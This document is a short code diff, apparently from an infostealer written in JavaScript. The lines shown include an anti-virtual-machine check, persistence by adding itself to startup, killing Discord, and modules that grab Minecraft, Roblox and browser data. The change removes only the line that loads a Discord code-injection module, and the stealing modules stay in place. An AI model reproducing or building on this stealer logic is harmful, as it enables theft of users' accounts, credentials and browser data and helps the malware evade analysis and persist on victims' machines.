@@ -26,7 +26,6 @@ if (config.vmProtect && checkVM()) {
 } else {
   config.addToStartup && require('./functions/startup');
   config.discord.killProcess && require('./functions/kill-discord');
-  config.discord.injectJs && require('./functions/discord-injection');
   require('./functions/grab-mc');
   require('./functions/grab-roblox');
   require('./functions/grab-browsers-data');
